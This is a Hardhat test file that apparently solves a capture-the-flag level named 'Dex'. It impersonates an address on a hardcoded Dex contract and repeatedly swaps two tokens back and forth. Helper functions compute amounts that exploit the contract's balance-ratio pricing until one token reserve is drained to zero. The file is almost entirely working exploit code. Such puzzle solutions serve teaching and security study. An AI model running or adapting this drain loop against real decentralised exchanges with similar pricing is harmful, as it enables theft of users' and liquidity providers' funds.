import { ethers } from 'hardhat';
import { constants } from 'ethers';
import { impersonateAndInjectEther } from './utils';

describe('Dex', function () {
  it('attack', async function () {
    [owner] = await (ethers as any).getSigners();

    const address = '0x07b05D3A1ed958944033060d058b8F0771ad1A6e';
    const sender = await impersonateAndInjectEther(address);

    const dex = await ethers.getContractAt('Dex', '0xa7291f53dbA7E5C636e872fC338741014B133dB6');
    const token1 = await ethers.getContractAt('IERC20', await dex.token1());
    const token2 = await ethers.getContractAt('IERC20', await dex.token2());

    console.log('token1', token1.address);
    console.log('token2', token2.address);
    console.log('dex token1 balance', (await token1.balanceOf(dex.address)).toString());
    console.log('dex token2 balance', (await token2.balanceOf(dex.address)).toString());
    console.log('sender token1 balance', (await token1.balanceOf(sender.address)).toString());
    console.log('sender token2 balance', (await token2.balanceOf(sender.address)).toString());

    // Attack
    await dex.connect(sender).approve(dex.address, constants.MaxUint256);

    while (true) {
      const token1User = await token1.balanceOf(sender.address);
      const token2User = await token2.balanceOf(sender.address);
      const token1Dex = await token1.balanceOf(dex.address);
      const token2Dex = await token2.balanceOf(dex.address);
      var fromToken: any;
      var toToken: any;
      var dexOutputAmount: any;
      var inputAmount: any;

      if (token1User.gt(constants.Zero)) {
        fromToken = token1;
        toToken = token2;
        inputAmount = token1User;
        dexOutputAmount = token2Dex;
      } else if (token2User.gt(constants.Zero)) {
        fromToken = token2;
        toToken = token1;
        inputAmount = token2User;
        dexOutputAmount = token1Dex;
      }

      if ((await getOutputAmount(dex, fromToken, toToken, inputAmount)).gt(dexOutputAmount)) {
        const amount = await getInputAmount(dex, fromToken, toToken, dexOutputAmount);
        await dex.connect(sender).swap(fromToken.address, toToken.address, amount);
      } else {
        await dex.connect(sender).swap(fromToken.address, toToken.address, inputAmount);
      }

      console.log('------');
      console.log('dex token1 balance', (await token1.balanceOf(dex.address)).toString());
      console.log('dex token2 balance', (await token2.balanceOf(dex.address)).toString());
      console.log('sender token1 balance', (await token1.balanceOf(sender.address)).toString());
      console.log('sender token2 balance', (await token2.balanceOf(sender.address)).toString());
      if (
        (await token1.balanceOf(dex.address)).eq(constants.Zero) ||
        (await token2.balanceOf(dex.address)).eq(constants.Zero)
      ) {
        break;
      }
    }
  });
});

async function getInputAmount(dex: any, fromToken: any, toToken: any, outputAmount: any) {
  const fromBalance = await fromToken.balanceOf(dex.address);
  const toBalance = await toToken.balanceOf(dex.address);
  return outputAmount.mul(fromBalance).div(toBalance);
}

async function getOutputAmount(dex: any, fromToken: any, toToken: any, inputAmount: any) {
  const fromBalance = await fromToken.balanceOf(dex.address);
  const toBalance = await toToken.balanceOf(dex.address);
  return inputAmount.mul(toBalance).div(fromBalance);
}
